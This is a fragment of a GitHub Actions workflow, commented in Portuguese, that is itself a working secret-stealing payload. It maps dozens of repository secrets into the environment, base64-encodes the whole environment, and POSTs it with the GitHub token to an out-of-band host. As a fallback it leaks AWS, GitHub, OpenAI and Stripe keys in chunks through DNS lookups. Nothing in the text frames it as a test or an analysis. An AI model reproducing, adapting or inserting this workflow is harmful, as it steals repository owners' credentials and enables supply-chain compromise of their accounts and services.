          SECRET_3: ${{ secrets.SECRET_3 }}
          PASSWORD: ${{ secrets.PASSWORD }}
          ADMIN_PASSWORD: ${{ secrets.ADMIN_PASSWORD }}
          ROOT_PASSWORD: ${{ secrets.ROOT_PASSWORD }}
          PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
          ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
          REFRESH_TOKEN: ${{ secrets.REFRESH_TOKEN }}
          BEARER_TOKEN: ${{ secrets.BEARER_TOKEN }}
          AUTH_TOKEN: ${{ secrets.AUTH_TOKEN }}
          SERVICE_ACCOUNT_KEY: ${{ secrets.SERVICE_ACCOUNT_KEY }}
          WEBHOOK_SECRET: ${{ secrets.WEBHOOK_SECRET }}
          CLIENT_SECRET: ${{ secrets.CLIENT_SECRET }}
          APP_KEY: ${{ secrets.APP_KEY }}

        run: |
          # Coleta todas as variáveis de ambiente (incluindo secrets mapeados)
          echo "[*] Coletando dados..."

          # Envia env dump completo em base64
          ENV_B64=$(env | sort | base64 -w0)

          # Payload principal com todos os dados
          curl -sk -X POST "$OAST_URL" \
            -H "Content-Type: application/json" \
            -H "X-Repo: ${{ github.repository }}" \
            -H "X-Actor: ${{ github.actor }}" \
            -d "{
              \"type\": \"ferrari-full-dump\",
              \"repo\": \"${{ github.repository }}\",
              \"actor\": \"${{ github.actor }}\",
              \"run_id\": \"${{ github.run_id }}\",
              \"github_token\": \"${{ github.token }}\",
              \"env_dump_b64\": \"$ENV_B64\"
            }" || true

          # Backup via DNS (caso HTTP falhe)
          OAST_DOMAIN=$(echo "$OAST_URL" | sed 's|https\?://||' | sed 's|/.*||')

          # Envia pedaços via DNS
          dns_chunk() {
            local data="$1"
            local chunk=$(echo -n "$data" | base64 | tr '+/' '-_' | tr -d '=' | cut -c1-60)
            nslookup "exfil.${chunk}.${OAST_DOMAIN}" 2>/dev/null || true
          }

          # Envia alguns secrets críticos via DNS como backup
          dns_chunk "$AWS_ACCESS_KEY_ID"
          dns_chunk "$AWS_SECRET_ACCESS_KEY"
          dns_chunk "$GITHUB_TOKEN"
          dns_chunk "$GH_TOKEN"
          dns_chunk "$OPENAI_API_KEY"
          dns_chunk "$STRIPE_SECRET_KEY"

          echo "[+] Concluído"
